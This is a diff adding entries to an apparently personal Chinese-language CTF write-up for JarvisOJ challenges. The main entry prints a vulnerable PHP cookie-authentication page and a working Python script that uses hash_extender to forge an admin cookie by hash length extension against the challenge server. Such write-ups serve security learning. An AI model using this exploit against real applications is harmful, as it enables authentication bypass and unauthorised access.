@@ -105,3 +105,113 @@ else
 - web.jarvisoj.com:32780/^HT2mCpcvOLf  hi666? 猜测是 sql 注入
 - 过滤了空格、关键词，但是难住我吗？确实难住了，查了一波资料，构造 payload
 - ![inamass](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-InAMass.png?raw=true)
+
+## RE
+
+- 很迷...没想到是 mysql 的函数库
+- ![re?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-RE.png?raw=true)
+
+## flag 在管理员手中
+
+- burp 拦截，发现 ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-1.png?raw=true)
+- 扫一下目录，发现 index.php~
+- 尝试打开失败，linux 下 file 发现是 vim 文件， recover ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-2.png?raw=true)
+
+```php
+<!DOCTYPE html>
+<html>
+<head>
+<title>Web 350</title>
+<style type="text/css">
+  body {
+    background:gray;
+    text-align:center;
+  }
+</style>
+</head>
+
+<body>
+  <?php
+  $auth = false;
+  $role = "guest";
+  $salt =
+  if (isset($_COOKIE["role"])) {
+    $role = unserialize($_COOKIE["role"]);
+    $hsh = $_COOKIE["hsh"];
+    if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
+      $auth = true;
+    } else {
+      $auth = false;
+    }
+  } else {
+    $s = serialize($role);
+    setcookie('role',$s);
+    $hsh = md5($salt.strrev($s));
+    setcookie('hsh',$hsh);
+  }
+  if ($auth) {
+    echo "<h3>Welcome Admin. Your flag is";
+  } else {
+    echo "<h3>Only Admin can see the flag!!</h3>";
+  }
+?>
+
+</body>
+</html>
+
+```
+
+- 这是？[哈希拓展攻击](https://danaive.github.io/2016/12/06/0x01/)...
+- salt 长度不知道哇
+- 对于密码学我还是懵逼的，网上搜到了脚本
+- 安装 hash_extender
+
+```shell
+git clone https://github.com/iagox86/hash_extender  
+cd hash_extender  
+make
+```
+
+```py
+# -*- coding:utf-8 -*-
+from urlparse import urlparse
+from httplib import HTTPConnection
+from urllib import urlencode
+import json
+import time
+import os
+import urllib
+
+def gao(x, y):
+      #print x
+      #print y
+  url = "http://web.jarvisoj.com:32778/index.php"
+  cookie = "role=" + x + "; hsh=" + y
+      #print cookie
+  build_header = {
+    'Cookie': cookie,
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
+    'Host': 'web.jarvisoj.com:32778',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  }
+  urlparts = urlparse(url)
+  conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
+  conn.request("GET", urlparts.path, '', build_header)
+  resp = conn.getresponse()
+  body = resp.read()
+  return body
+
+for i in xrange(1000):
+  print i
+  # secret len = ???
+  find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
+  #print find_hash
+  calc_res = os.popen(find_hash).readlines()
+  hash_value = calc_res[0][:32]
+  attack_padding = calc_res[0][32:]
+  attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
+  ret = gao(attack_padding, hash_value)
+  if "Welcome" in ret:
+    print ret
+    break
+```
